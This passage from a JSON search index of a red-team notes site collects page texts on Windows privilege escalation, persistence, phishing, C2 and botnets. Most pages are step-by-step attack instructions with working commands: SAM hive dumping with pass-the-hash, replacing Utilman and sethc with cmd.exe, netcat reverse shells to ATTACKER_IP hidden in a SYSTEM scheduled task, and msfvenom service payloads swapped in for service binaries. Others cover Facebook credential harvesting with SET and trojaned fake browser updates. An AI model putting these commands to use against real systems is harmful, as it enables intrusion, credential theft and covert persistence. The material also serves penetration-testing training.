    "c": "Abusing dangerous privileges  Attack tree  1 Abusing dangerous privileges 1.1 SeBackup/SeRestore abuse (OR) 1.2 SeTakeOwnership abuse (OR) 1.3 SeImpersonate/SeAssignPrimaryToken abuse Examples  SAM and SYSTEM registry  This hack consists of copying the SAM and SYSTEM registry hives to extract the local Administrator’s password hash. Check currently assigned privileges: whoami /priv The current account ( Backup ) is part of the “Backup Operators” group, which by default is granted the SeBackup and SeRestore privileges. Open a command prompt with the “Open as administrator” option to use these privileges. Check privileges again: C:\\> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Backup the SAM and SYSTEM hashes: C:\\> reg save hklm\\system C:\\Users\\Backup\\system.hive The operation completed successfully. C:\\> reg save hklm\\sam C:\\Users\\Backup\\sam.hive The operation completed successfully. Copy these files to the attacker machine using SMB or any other available method. For SMB, use impacket’s smbserver.py to start a simple SMB server with a network share in the current directory. # mkdir share # python3 /opt/impacket/examples/smbserver.py -smb2support -username Backup -password <password of Backup> public share Use the copy command in the Windows machine to transfer both files to the attack machine: C:\\> copy C:\\Users\\Backup\\sam.hive \\\\<IP address attack machine>\\public\\ C:\\> copy C:\\Users\\Backup\\system.hive \\\\<IP address attack machine>\\public\\ Use impacket to retrieve the users’ password hashes: # python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL Use the Administrator’s hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges: # python3 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@<IP address attack machine> ... C:\\Windows\\system32> whoami nt authority\\system Replacing Utilman  Open a command prompt using “Open as administrator” and check privileges: C:\\> whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ======================================== ======== SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. It is run with SYSTEM privileges, so we can gain SYSTEM privileges by replacing the original binary with any payload. Because we can take ownership of any file, replacing it is trivial. Take ownership of utilman.exe : C:\\> takeown /f C:\\Windows\\System32\\Utilman.exe SUCCESS: The file (or folder): \"C:\\Windows\\System32\\Utilman.exe\" now owned by user \"WINPRIVESC2\\thmtakeownership\". Give the user you are logged in as, full permissions over utilman.exe C:\\> icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:F processed file: Utilman.exe Successfully processed 1 files; Failed processing 0 files Replace utilman.exe with a copy of cmd.exe : C:\\Windows\\System32\\> copy cmd.exe utilman.exe 1 file(s) copied. To trigger utilman, lock the screen from the start button, then click on the “Ease of Access” button, which runs utilman.exe with SYSTEM privileges. C:\\Windows\\system32> whoami nt authority\\system FTP impersonation  An FTP service running with user ftp . Without impersonation, if a user logs into the FTP server and tries to access ftp files, the FTP service would try to access them with its access token rather than Ann’s. With ftp token like this, we must manually configure specific permissions for each served file/directory. The ftp user has access to all files. If the FTP service were compromised at some point, the attacker would immediately gain access to all folders to which the ftp user has access. If instead, the FTP service’s user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf. If we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process. Plant a web shell on http://IP address target/ Use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest. Upload RogueWinRM to the target machine. The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, a port that exposes a Powershell console to be used remotely through the network. Start a netcat listener: # nc -lvp 4442 Use the web shell to trigger the RogueWinRM exploit: c:\\tools\\RogueWinRM\\RogueWinRM.exe -p \"C:\\tools\\nc64.exe\" -a \"-e cmd.exe ATTACKER_IP 4442\" The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. The exploit may take up to 2 minutes to work, so the browser may appear unresponsive for a bit. c:\\windows\\system32\\inetsrv>whoami nt authority\\system Notes  Privileges are rights that an account has to perform specific system-related tasks. These tasks can be from the privilege to shut down the machine up to privileges to bypass some DACL-based access controls. SeBackup/SeRestore  The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges. Having this power, an adversary can trivially escalate privileges on the system by using many techniques. SeTakeOwnership  The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges. For example, search for a service running as SYSTEM and take ownership of the service’s executable. SeImpersonate/SeAssignPrimaryToken  These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user. Resources  Privilege Constants (Authorization) Priv2Admin",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "bbde79e5c6360880eb72f7f5e8dbe796",
    "u": "https://fire.tymyrddin.dev/docs/weapons/out-of-the-box",
    "t": "Getting out of the box (BeEF) ",
    "c": "Getting out of the box (BeEF)  Attack tree  1 Port forwarding 1.1 Backdoor with public IP and port 8080 (for example) (AND) 1.2 Listen on local IP port 8080 (AND) 1.3 Set port forwarding on router for receiving msg from backdoor (AND) 1.3.1 Public port range (8080) (AND) 1.3.2 Address local machine (192.168.122.108) (AND) 1.3.3 Target port range (8080) (AND) 1.3.4 Protocol (Both, or TCP) 1.4 Set port forwarding on router for allowing download of evil files from apache2 server (AND) 1.4.1 Public port range (80) (AND) 1.4.2 Address local machine (192.168.122.108) (AND) 1.4.3 Target port range (80) (AND) 1.4.4 Protocol (Both, or TCP) 1.5 Change BeEF script to use public IP (AND) 1.6 Set port forwarding on router for BeEF 1.6.1 Public port range (3000) (AND) 1.6.2 Address local machine (192.168.122.108) (AND) 1.6.3 Target port range (3000) (AND) 1.6.4 Protocol (Both, or TCP) 2 DMZ Kali machine 2.1 Enter local IP address of Kali machine Notes  Alternatives for pentesting  Port forwarding using an SSH server Tunneling services Proxy chaining C2 Alternatives for red teaming  A foothold in the cloud using Infrastructure as Code.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7fac85da7a86ae733bc98f27cfbe4728",
    "u": "https://fire.tymyrddin.dev/docs/phishing/fake-login",
    "t": "Steal access info with fake login page ",
    "c": "Steal access info with fake login page  Attack tree  1 Clone login page with for example, webscrapbook (AND) 1.1 Download login page -> capure tab (source) (AND) 1.2 Extract downloaded archive and rename for easier use 2 Use set on Kali (AND) 2.1 Social Engineering Attacks (1) -> Website Attack vectors (2) -> Credential Harvester Attack method (3) -> Custom Import (3) (AND) 2.2 Enter IP address, absolute path to extracted clone (ending with /) (AND) 2.3 Copy entire folder (2) (AND) 2.4 URL for the original website 3 Manipulate URL (AND) 3.1 Shorten 4 Deliver link to target (for example spoof email from support to get user to login) 5 Wait for it ... Example using SET  Set up a clone  On Kali, run ifconfig in a terminal and record the IP address. In the terminal session, run the setoolkit command to launch SET. Read and then choose y to agree to the terms to go to the SET main menu screen. Type 1 to perform a social engineering attack and press Enter. Type 2 for Website Attack Vectors and press Enter. Type 3 to perform a credential harvester attack and then press Enter. Type 2 to choose Site Cloner and press Enter. Site Cloner copies a real website in order to create a fake site that tricks users into entering their passwords. You are asked for the IP address for the POST back in Harvester/Tabnabbing. This is the IP address of where you want the site to be copied. Type the IP address of your Kali Linux and press Enter. You are asked which website to clone. Clone the Facebook website with https://www.facebook.com . The Facebook site is copied to your Kali system and set up to listen on port 80. To test the site out, launch a web browser and type http://<IP_of_Kali> . Trick victim(s) into visiting the fake site  With SET running, have users navigate to the fake website and log on. Send an email or text message with the link. Check the harvester file for passwords  Switch back to the terminal running SET. Some activity was generated in SET. Press CTRL+C to generate a report. The reports are stored in the /root/.set//reports folder. There is an HTML and an XML report. To check out the HTML report, click the folder icon in the Kali toolbar and then choose Home on the left. Set “Show Hidden Files” and navigate to .set/Reports . Double-click the HTML report to view the results including any email addresses and passwords typed into the fake site. Notes  The simplest scenario. It is not necessary to use SET for the cloning. Other tools like WebScrapBook and curl can do too. Explore and get creative. Tools  WebScrapBook Social engineering toolkit",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8f2263ed05dced5e953ae5766eb80a4e",
    "u": "https://fire.tymyrddin.dev/docs/escalation/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Windows presents an enormous attack surface and most companies run Windows hosts, so we will often find ourselves gaining access to Windows machines. These are all methods on common real-world misconfigurations and flaws in modern and legacy Windows Server and Desktop versions that may be present in a client environment. Why?  Elevating privileges will provide more options for persistence and may reveal information stored locally that can further our access in the environment. How?  Windows escalation tools Reuseful escalation patterns Harvesting passwords Quick misconfiguration wins Abusing service misconfigurations Abusing dangerous privileges Abusing vulnerable software",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8b6633f6b60dcadb843e10418e093a5f",
    "u": "https://fire.tymyrddin.dev/docs/weapons/botnet",
    "t": "Create a botnet ",
    "c": "Create a botnet  From research, what appears to be happening. Attack tree  1 Set up a command-and-control infrastructure 1.1 Set up a webserver (AND) 1.2 Get a botnet builder tool for malware such as Ice IX (AND) 1.3 Set up the parameters (AND) 1.3.1 How often the zombie is to communicate with the command server (AND) 1.3.2 What actions to take (AND) 1.3.3 How to hide from anti-virus scans (AND) 1.3.4 Location of its control and command server 1.4 Upload command-and-control to server 2 Make payload file (AND) 2.1 Crypt and pack 3 Spread file 2.1 Phishing (OR) 2.2 Install using MitM (targeted attack) (OR) 2.3 Credential stuffing (buy credentials that have been leaked through data breaches or other means) 2.4 Other tactics Notes  A botnet (“robot network”) is a network of computers infected by malware that are under the control of a single attacking party. Botnets are typically used in: Email spam campaigns. These botnets are the largest. The spam messages can include malware, and can also be used to recruit more computers to the botnet. DDoS attacks that target organisations for personal or political motives or to extort payment in exchange for ceasing the attack. Credential stuffing to gain access to accounts from data breaches to drain the associated accounts of stored values, credit card information, personally identifiable information and/or to use the account for impersonation, and for actions like sending spam. Targeted intrusions where typically small botnets compromise high-value systems of organisations from which attackers can penetrate and intrude further into the network. With just one zombie in an organisation, the adversary can now read email and monitor traffic and communications for sniffing out passwords, identifying databases, and looking for users with more administrative powers. The assets an adversary can look for include password databases, financial data, research and development, intellectual property, and customer information. Botnet infiltration works incredibly fast because most people will trust files that appear to have originated with other employees inside the network and will pass along files from sources they know. A botnet is not just a malware infection, it is like having an adversary inside the network. Articles  Most Dangerous Botnets That are Still in the Game , CloudTweaks, 2022 Why Current Botnet Takedown Jurisprudence Should Not Be Replicated , LawFare, 2021 MasterBlaster: Identifying Influential Players in Botnet Transactions , IEEE 2011 but with a nice explanation of components",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "b5b17fd309d0551a1c2f6cdc91c9e57b",
    "u": "https://fire.tymyrddin.dev/docs/phishing/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon, adapting the attack infrastructure, setting up the hooks, running the phishing campaign. Why?  Getting in. How?  Phishing overview Mail delivery Steal access info with fake login page Webpage with BeEF hook Use analytics to lure a target Fake prompts everywhere Pharming overview Credential stuffing",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5ca7ec59611efda86f86bd4a16da6376",
    "u": "https://fire.tymyrddin.dev/docs/weapons/delivery",
    "t": "Delivery techniques ",
    "c": "Delivery techniques  Delivery techniques have to look professional, legitimate, and convincing to the victim in order to follow through with the content. Email delivery  Email delivery is a common method to send the payload by sending a phishing email with a link or attachment. The goal is to convince the victim to visit a malicious website or download and run the malicious file to gain initial access to the victim’s network or host. Red teamers have their own infrastructure for phishing purposes . Depending on the red team engagement requirement, it requires setting up various options within the email server, including DomainKeys Identified Mail (DKIM), Sender Policy Framework (SPF), and DNS Pointer (PTR) record. Red teamers can also use third-party email services such as Google Gmail, Outlook, Yahoo, and others with good reputations. Another possibility would be to use a compromised email account within an organisation to send phishing emails within the organisation or to others. The compromised email could be hacked by phishing or by other techniques such as password spraying attacks. Web Delivery  Another method is hosting payloads on a web server controlled by the red teamers. The web server has to follow the security guidelines such as a clean record and reputation of its domain name and a TLS (Transport Layer Security) certificate. This method includes other techniques such as social engineering the victim to visit or download the malicious file. A URL shortener and other tricks could be helpful when using this method. In this method, other techniques can be combined and used. The attacker can take advantage of zero-day exploits such as exploiting vulnerable software like Java or browsers to use them in phishing emails or web delivery techniques to gain access to the victim machine. USB Delivery  This method requires the victim to plug in the USB with payload physically. This method could be effective and useful at conferences or events where the adversary can distribute the USB. Organisations may have strong security policies such as disabling USB usage within the organisation environment. Not all do. Common USB attacks used to weaponise USB devices include Rubber Ducky and USBHarpoon, charging USB cable, such as O.MG Cable.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "0a7b20b56752bd8887d3d55d4fb05adc",
    "u": "https://fire.tymyrddin.dev/docs/enum/dns",
    "t": "DNS ",
    "c": "DNS  If we can get a copy of all the records that a DNS server is responsible for answering, we might discover hosts we did not know existed. One easy way to try DNS zone transfer is via the dig command. Depending on the DNS server configuration, DNS zone transfer might be restricted. If it is not restricted dig -t AXFR DOMAIN_NAME @DNS_SERVER The -t AXFR indicates a zone transfer, and @ precedes the DNS_SERVER we want to query regarding the records related to the specified DOMAIN_NAME .",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "749e7d69edd579bf4a1534588a6f7542",
    "u": "https://fire.tymyrddin.dev/docs/persistence/tasks",
    "t": "Abusing scheduled tasks ",
    "c": "Abusing scheduled tasks  The most common way to schedule tasks is using the built-in Windows task scheduler . The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. Create a task that runs a reverse shell every minute. In a real-world scenario, you will not want your payload to run that often, but we don’t want to wait too long for this exercise: schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr \"c:\\tools\\nc64 -e cmd.exe ATTACKER_IP 4449\" /ru SYSTEM SUCCESS: The scheduled task \"THM-TaskBackdoor\" has successfully been created. The /sc and /mo options indicate that the task should be run every single minute. The /ru option indicates that the task will run with SYSTEM privileges. Check with: schtasks /query /tn thm-taskbackdoor To hide the scheduled task, make it invisible to any user in the system by deleting its Security Descriptor (SD). The security descriptor is an ACL that states which users have access to the scheduled task. If a user is not allowed to query a scheduled task, it will not be visible, as Windows only shows the tasks that a user has permission to use. Deleting the SD is equivalent to disallowing all users’ access to the scheduled task, including Administrators. The security descriptors of all scheduled tasks are stored in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\ . There is a registry key for every task, under which a value named SD contains the security descriptor. You can only erase the value if you have SYSTEM privileges. Use psexec (available in C:\\tools ) to open Regedit with SYSTEM privileges: c:\\tools\\pstools\\PsExec64.exe -s -i regedit And delete the security descriptor for the task. Checking, the system reports there is no such task: schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified. Start a listener on the attack machine: nc -nlvp 4449 And a reverse shell.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "80bcffcb037fc7d85fdcfa21bc9dcab4",
    "u": "https://fire.tymyrddin.dev/docs/exfiltration/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Data exfiltration is a non-traditional approach for copying and transferring data from a compromised to an attacker’s machine. The data exfiltration technique is used to emulate the normal network activities, and relies on common network protocols such as DNS, HTTP, SSH, etc. Why?  Data Exfiltration over common protocols is challenging to detect and distinguish between legitimate and malicious traffic. How?  Data exfiltration (in “Out”)",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "32c0139deeb9ef21442bd5a1e5897793",
    "u": "https://fire.tymyrddin.dev/docs/phishing/fake-prompts",
    "t": "Fake prompts everywhere ",
    "c": "Fake prompts everywhere  Attack tree  1 Delivery with BeEF 1.1 BeEF hooked target browser (AND) 1.2 Pretty theft command in BeEF (OR) 1.3 Fake Windows 10 Firefox update (OR) 1.3.1 Windows trojan with firefox installer and Empire backdoor (.exe) (AND) 1.3.2 BeEF social engineering Clippy command executed 1.3.2.1 Kali apache2 server IP in clippy image directory field 1.3.2.2 Executable field with url to Firefox.exe on server 1.3.3 Interact with empire agent 1.4 Fake macOS update (OR) 1.4.1 macOS trojan with firefox installer and Empire backdoor (.zip) (AND) 1.4.2 BeEF social engineering Fake notification bar command executed 1.4.2.1 url to Firefox.zip on apache2 server 1.4.2.2 Fitting message 1.4.3 Interact with empire agent 1.5 Fake Linux update 1.5.1 Linux trojan 1.5.2 BeEF social engineering Flash update command executed 1.5.2.1 Kali apache2 server IP in image field 1.5.2.2 Custom_Payload 1.5.2.3 url to flash-update.deb on apache2 server on Kali 1.5.3 Interact with empire agent Notes  Fake Linux Firefox update does not work for Ubuntu 22.04+. Is now a snapd. Many more possibilities, with other commands as well. Get creative. Tools  BeEF in Kali",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4c587fe4edfc216e0c877ec3a1f8945d",
    "u": "https://fire.tymyrddin.dev/docs/persistence/backdoor-login",
    "t": "Backdooring the login screen/RDP ",
    "c": "Backdooring the login screen/RDP  With physical access to the machine (or RDP in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine. Sticky Keys  When pressing key combinations like CTRL+ALT+DEL , you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and release CTRL , press and release ALT and finally, press and release DEL to achieve the same effect as pressing the CTRL+ALT+DEL combination. To establish persistence using Sticky Keys, we can abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing SHIFT 5 times after which Windows will execute the binary in C:\\Windows\\System32\\sethc.exe . If we replace the binary with a payload, we can then trigger it with the shortcut. We can even do this from the login screen before entering any credentials. We can replace sethc.exe with a copy of cmd.exe to spawn a console using the sticky keys shortcut, even from the login screen. To overwrite sethc.exe , we first need to take ownership of it and grant the current user permission to modify it. takeown /f c:\\Windows\\System32\\sethc.exe icacls C:\\Windows\\System32\\sethc.exe /grant Administrator:F copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe Lock the current session from the start menu, and press SHIFT 5 times to access a terminal with SYSTEM privileges directly from the login screen. Utilman  Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen. When clicking the ease of access button on the login screen, it executes C:\\Windows\\System32\\Utilman.exe with SYSTEM privileges. Replacing it with a copy of cmd.exe , we can bypass the login screen again. To replace utilman.exe : takeown /f c:\\Windows\\System32\\utilman.exe icacls C:\\Windows\\System32\\utilman.exe /grant Administrator:F copy c:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe To trigger the terminal, lock the screen from the start button, and click on the “Ease of Access” button.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "7ebbcb408a9ccd3de1f302f534466f27",
    "u": "https://fire.tymyrddin.dev/docs/opsec/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Use OPSEC, a systematic and proven process by which potential adversaries can be denied information about capabilities and intentions by identifying, controlling, and protecting generally unclassified evidence of the planning and execution of sensitive activities. Why?  The blue team are our adversaries and would love to know about our operations. How?  Identify critical information Analyse threats Analyse vulnerabilities Assess risks Apply appropriate countermeasures Hide your tracks",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "57df6e6d8e3983abfcaa5532abc23ba1",
    "u": "https://fire.tymyrddin.dev/docs/weapons/c2",
    "t": "Command and control (C2) ",
    "c": "Command and control (C2)  With a foot into the door, maintain persistence within the target environment, communicate with infected or compromised devices inside the network, and potentially exfiltrate sensitive data. C2 frameworks are post-exploitation frameworks that allow red teamers to collaborate and control compromised machines. C2 is considered one of the most important tools for red teamers during offensive cyber operations. C2 frameworks provide fast and straightforward approaches to: Generate various malicious payloads Enumerate the compromised machine/networks Perform privilege escalation and pivoting Lateral movement … This page looks at Cobalt Strike, PowerShell Empire, Metasploit. Most of these frameworks aim to support a convenient environment to share and communicate between red team operations once the initial access is gained to a system. Cobalt Strike  Cobalt Strike is a commercial framework that focuses on Adversary Simulations and Red Team Operations. It is a combination of remote access tools, post-exploitation capabilities, and a reporting system. It provides an agent with advanced techniques to establish covert communications and perform various operations, including key-logging, files upload and download, VPN deployment, privilege escalation techniques, mimikatz, port scanning, and the most advanced lateral movements. Even without much knowledge one can do (making it dangerous), and it is extremely expensive. PowerShell Empire  PowerShell Empire is an open-source framework that helps red team operators and pen testers collaborate across multiple servers using keys and shared passwords. It is an exploitation framework based on PowerShell and Python agents. PowerShell Empire focuses on client-side and post-exploitation of Windows and Active Directory environment. Starkiller is a GUI for Powershell Empire. Installation on a Kali VM  Make a snapshot of the VM, so you can roll back in case something goes wrong. sudo su apt update && apt -y full-upgrade Make another snapshot, and install powershell empire and starkiller: sudo apt install -y powershell-empire starkiller Defaults are empireadmin:password123 . Change asap. Launch  Start the server: sudo powershell-empire server Start the client: sudo powershell-empire client Start de GUI (if you wish, we do without): starkiller --no-sandbox Metasploit  Metasploit is a widely used exploitation framework that offers various techniques and tools to perform hacking easily. It is an open-source framework and is considered one of the primary tools for pentesting and red team operations. Metasploit is one of the tools we use a lot.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "8c7c21065ff92496ed2a3f29d39bab87",
    "u": "https://fire.tymyrddin.dev/docs/weapons/wsh",
    "t": "Windows Scripting Host (WSH) ",
    "c": "Windows Scripting Host (WSH)  Windows scripting host is a built-in Windows administration tool which runs batch files to automate and manage tasks within the operating system using VBScript. Show a message box  Dim message message = \"Hello\" MsgBox message run it in cmd: wscript hello.vbs Run exe files  Run an exe file with VBScript: Set shell = WScript.CreateObject(\"Wscript.Shell\") shell.Run(\"C:\\Windows\\System32\\calc.exe \" & WScript.ScriptFullName),0,True Execute it with wscript : wscript c:\\path\\to\\calc.vbs or cscript : cscript.exe c:\\path\\to\\calc.vbs In case of blacklisting, rename it to, for example, payload.txt and run it: wscript /e:VBScript c:\\path\\to\\payload.txt",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "39a928e08e8aa1a0801131aad050fdb2",
    "u": "https://fire.tymyrddin.dev/docs/escalation/services",
    "t": "Abusing service misconfigurations ",
    "c": "Abusing service misconfigurations  Attack tree  1 Escalate through insecure permissions on service executable (OR) 1.1 Misconfigured Service executable DACL (modifiable permissions on the executable) (AND) 1.2 Reverse shell payload replacing service executable (AND) 1.2 Listener on attack machine 2 Escalate through unquoted service path (OR) 2.1 Service binaries in a non-default path (AND) 2.2 BUILTIN\\\\Users group has AD and WD privileges (AND) 2.3 Reverse shell exe-service payload (AND) 2.4 Listener on attack machine 3 Escalate through insecure service permissions 3.1 Misconfigured Service DACL (AND) 3.2 Reverse shell exe-service payload (AND) 3.3 Listener on attack machine Examples  WindowsScheduler  Check service with sc cq : C:\\> sc qc WindowsScheduler [SC] QueryServiceConfig SUCCESS SERVICE_NAME: windowsscheduler TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\PROGRA~2\\SYSTEM~1\\WService.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : System Scheduler Service DEPENDENCIES : SERVICE_START_NAME : .\\svcuser1 Check the permissions on the executable: C:\\Users\\unprivilegedusername>icacls C:\\PROGRA~2\\SYSTEM~1\\WService.exe C:\\PROGRA~2\\SYSTEM~1\\WService.exe Everyone:(I)(M) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Administrators:(I)(F) BUILTIN\\Users:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX) APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX) The Everyone group has modify permissions (M) on the service’s executable. We can overwrite it with any payload, and the service will execute it with the privileges of the configured user account. Generate an exe-service payload using msfvenom and serve it through a python webserver: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4445 -f exe-service -o rev-svc.exe # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc.exe -O rev-svc.exe Replace the service executable with the payload: C:\\> cd C:\\PROGRA~2\\SYSTEM~1\\ C:\\PROGRA~2\\SYSTEM~1> move WService.exe WService.exe.bkp 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1> move C:\\Users\\unprivilegedusername\\rev-svc.exe WService.exe 1 file(s) moved. C:\\PROGRA~2\\SYSTEM~1> icacls WService.exe /grant Everyone:F Successfully processed 1 files. Start listener on attack machine: # nc -lvp 4445 Wait for the service to restart. Disk Sorter Enterprise  An unquoted service path was found. C:\\> sc qc \"disk sorter enterprise\" [SC] QueryServiceConfig SUCCESS SERVICE_NAME: disk sorter enterprise TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 0 IGNORE BINARY_PATH_NAME : C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Disk Sorter Enterprise DEPENDENCIES : SERVICE_START_NAME : .\\svcusr2 Generate an exe-service payload using msfvenom and serve it through a python webserver: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4446 -f exe-service -o rev-svc2.exe # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc2.exe -O rev-svc2.exe Move it to any of the locations where hijacking might occur. For example, move it to C:\\MyPrograms\\Disk.exe , and grant Everyone full permissions on the file to make sure it can be executed by the service: C:\\> move C:\\Users\\unprivilegedusername\\rev-svc2.exe C:\\MyPrograms\\Disk.exe C:\\> icacls C:\\MyPrograms\\Disk.exe /grant Everyone:F Successfully processed 1 files. Start listener on attack machine: # nc -lvp 4446 Start the “updated” service: C:\\> sc stop \"disk sorter enterprise\" C:\\> sc start \"disk sorter enterprise\" Misconfigured Service DACL  Download Accesschk from the Sysinternals suite to C:\\\\tools . Check a namedservice DACL: C:\\tools\\AccessChk> accesschk64.exe -qlc namedservice [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\\SYSTEM SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_PAUSE_CONTINUE SERVICE_START SERVICE_STOP SERVICE_USER_DEFINED_CONTROL READ_CONTROL [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\\Users SERVICE_ALL_ACCESS The BUILTIN\\\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service. Build another exe-service reverse shell and start a listener for it on the attacker’s machine: # msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=4447 -f exe-service -o rev-svc3.exe # nc -lvp 4447 # python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... On the target machine, in powershell, pull it down: wget http://<IP address attack machine>:8000/rev-svc3.exe -O rev-svc3.exe Grant permissions to Everyone : C:\\> icacls C:\\Users\\unprivilegedusername\\rev-svc3.exe /grant Everyone:F Change the service’s associated executable and account: C:\\> sc config NamedService binPath= \"C:\\Users\\unprivilegedusername\\rev-svc3.exe\" obj= LocalSystem We can use any account to run the service. LocalSystem is just the highest privileged account available. To trigger the payload, restart the service: C:\\> sc stop NamedService C:\\> sc start NamedService Notes  Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services. Use the sc qc someservice command for more info on a service. The associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter. Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. All services configurations are stored in the registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\\ A subkey exists for every service in the system. If a DACL has been configured for the service, it will be stored in a subkey called Security . Only administrators can modify such registry entries by default. Insecure Permissions on Service Executable  If an executable associated with a service has weak permissions that allow an adversary to modify or replace it, the adversary can gain the privileges of the service’s account. Unquoted path vulnerability  When we can’t directly write into service executables, there might still be a chance. Most of the service executables will be installed under C:\\Program Files or C:\\Program Files (x86) by default, which isn’t writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule. Some installers change the permissions on the installed folders, making the services vulnerable. An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, an “Unquoted Service Paths vulnerability” (if found) can be exploited. For example, the Administrator installed the Disk Sorter binaries under c:\\MyPrograms . By default, this inherits the permissions of the C:\\ directory, which allows any user to create files and folders in it. Check with icacls in the Command Prompt: C:\\>icacls c:\\MyPrograms c:\\MyPrograms NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(F) BUILTIN\\Administrators:(I)(OI)(CI)(F) BUILTIN\\Users:(I)(OI)(CI)(RX) BUILTIN\\Users:(I)(CI)(AD) BUILTIN\\Users:(I)(CI)(WD) CREATOR OWNER:(I)(OI)(CI)(IO)(F) The BUILTIN\\\\Users group has AD and WD privileges, allowing a user to create subdirectories and files. The Unquoted in “Unquoted Service Paths vulnerability” means that the path of the associated executable is not properly quoted to account for spaces on the command. Quoted: BINARY_PATH_NAME :...",
    "cat": "red_through",
    "type": "html"
  },
  {
